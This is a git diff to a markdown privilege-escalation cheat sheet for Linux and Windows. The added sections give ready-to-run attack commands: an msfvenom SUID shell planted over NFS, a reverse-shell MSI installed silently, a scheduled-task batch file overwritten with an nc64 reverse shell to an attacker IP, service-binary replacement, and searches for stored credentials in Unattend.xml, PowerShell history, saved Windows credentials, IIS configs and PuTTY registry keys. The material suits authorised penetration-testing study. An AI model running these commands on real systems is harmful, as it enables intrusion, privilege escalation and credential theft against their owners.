@@ -10,10 +10,6 @@ title: "Privilege Escalation"
 
 ## On linux
 
-Look at the current user and it's rights : `id`
-
-Look for the sudo rights, maybe a command can be abused : `sudo -l`
-
 ### SSH Login with metasploit
 
 connect to the host with metasploit 
@@ -52,6 +48,10 @@ There are 3 great script to automate privesc enumerations (test in this order):
 * [linux exploit suggester (included in some of the above)](https://github.com/The-Z-Labs/linux-exploit-suggester)
 
 #### Manual
+
+Look at the current user and it's rights : `id`
+
+Look for the sudo rights, maybe a command can be abused : `sudo -l`
 
 Search for a `/.dockerenv` file to know if you are in a container.
 
@@ -190,11 +190,20 @@ mkdir $NFS_MOUNTPOINT
 sudo mount.nfs -o nolock,rw,vers=$NFS_VERSION $TARGET_IP:$TARGET_EXPORT $NFS_MOUNTPOINT
 ```
 
-Generate a simple exploit as root and make it SUID
+Generate a simple exploit as root
 
 ```bash
-sudo msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o $NFS_MOUNTPOINT/shell.elf
-sudo chmod +xs $NFS_MOUNTPOINT/shell.elf
+# either generate an exploit
+sudo msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o $NFS_MOUNTPOINT/shell
+
+# or simply copy a bash shell from attacker or victim's host
+sudo cp /bin/bash $NFS_MOUNTPOINT/shell
+```
+
+Then, make it SUID
+
+```bash
+sudo chmod +xs $NFS_MOUNTPOINT/shell
 ```
 
 On the target, execute the malicious binary
@@ -416,6 +425,19 @@ tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=shell.elf
 
 ## On Windows
 
+### Basics
+
+There are 2 main groups on a local windows system :
+
+* `Administrators`
+* `Standard Users`
+
+But there are 3 "hidden" built-in accounts that are important:
+
+* `SYSTEM / LocalSystem`: which is more powerfull than a common administrator
+* `Local Service`: run Windows services
+* `Network Service`: run Windows services, use computer credentials to authenticate through the network
+
 ### Common Enumeration
 
 Automated: [Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS).
@@ -444,14 +466,73 @@ wmic service list
 
 There are 2 types of hash to autenticate users:
 
-* **LM (LAN Manager)**: old, vulnerable to brute-force
-* **NTLM (NT LAN Manager)**: modern, robust
+* **LM (LAN Manager)**: old, vulnerable to full brute-force
+* **NTLMv1 (NT LAN Manager)**: modern, vulnerable to pass the hash and dictionnary attacks
+* **NTLMv2 (NT LAN Manager)**: modern, robust
 
 **LSASS (Local Security Authority Subsystem Service)**: process that talks to the **SAM** to compare hashes / get mdps.
 
 **LSASS** temporary store passwords in plaintext. To allow kind of an SSO.
 
 You can use [mimikatz](https://github.com/gentilkiwi/mimikatz) to dump **SAM**'s hashes and break them with [John the Ripper](https://www.openwall.com/john/) !
+
+### Common files
+
+#### Unattended Windows Installations
+
+Administrators may use Windows Deployment Services to create "unattended installations" which don't require user interaction. This is leaving passwords and secrets in files.
+
+* `C:\Unattend.xml`
+* `C:\Windows\Panther\Unattend.xml`
+* `C:\Windows\Panther\Unattend\Unattend.xml`
+* `C:\Windows\system32\sysprep.inf`
+* `C:\Windows\system32\sysprep\sysprep.xml`
+
+#### Powershell History
+
+```powershell
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
+
+#### Saved Windows Credentials
+
+There is a feature that allow us to store other user's credentials.
+
+List de available credentials
+
+```powershell
+cmdkey /list
+```
+
+You can then login with:
+
+```powershell
+runas /savecred /user:admin cmd.exe
+```
+
+#### IIS Configuration
+
+The configuration of IIS can store passwords for databases or configured authentication mechanisms.
+
+Look for the following locations
+
+* `C:\inetpub\wwwroot\web.config`
+* `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`
+
+Here is a quick way to find database connection strings on the file:
+
+```powershell
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+```
+
+#### Credentials from Software
+
+PuTTY
+
+```powershell
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+```
 
 _Incomming (applications storage, configuration files, ...)_
 
@@ -483,6 +564,25 @@ _Incomming ..._
 
 (custom MSI installations)
 
+Check the following key to validate vulnarbility
+
+```powershell
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+```
+
+Create an msi file and upload it to the victim
+
+```powershell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=... LPORT=... -f msi -o malicious.msi
+```
+
+Install the malicious msi
+
+```powershell
+msiexec /quiet /qn /i C:\path\to\malicious.msi
+```
+
 The InstallerFileTakeOver vulnerability:
 
 * [original github (down)](https://github.com/klinix5/InstallerFileTakeOver)
@@ -495,3 +595,67 @@ The InstallerFileTakeOver vulnerability:
 
 _Incomming ..._
 
+
+### Scheduled Tasks
+
+Find a service details and look for the `Task To Run:` field.
+
+```bash
+schtasks /query /tn vulntask /fo list /v
+```
+
+Check access on the task file (F = full access)
+
+```bash
+icacls c:\path\to\the\task\file.bat
+```
+
+Override with a reverse shell
+
+```bash
+echo 'c:\path\to\nc64.exe -e cmd.exe $ATTACKER_IP $ATTACKER_PORT' > c:\path\to\the\task\file.bat
+```
+
+
+### Insecure Permissions on Service Executable
+
+Look at the service executable path
+
+```bash
+sc qc VulnerableService
+```
+
+Check if you can modify the bin
+
+```bash
+icacls c:\path\to\vulnerable.exe
+```
+
+Override the bin with a reverse shell
+
+```bash
+move malicious.exe c:\path\to\vulnarble.exe
+```
+
+Restart if you can or wait for someone to restart it
+
+```bash
+sc stop VulnerableService
+sc start VulnerableService
+```
+
+
+### Unquoted Service Paths
+
+Look at the service executable path
+
+```bash
+sc qc VulnerableService
+```
+
+If the path has spaces, you can inject malicious exe in PATH
+
+```bash
+C:\my program\path\has\spaces.exe # service binary
+C:\my.exe                         # malicious binary
+```
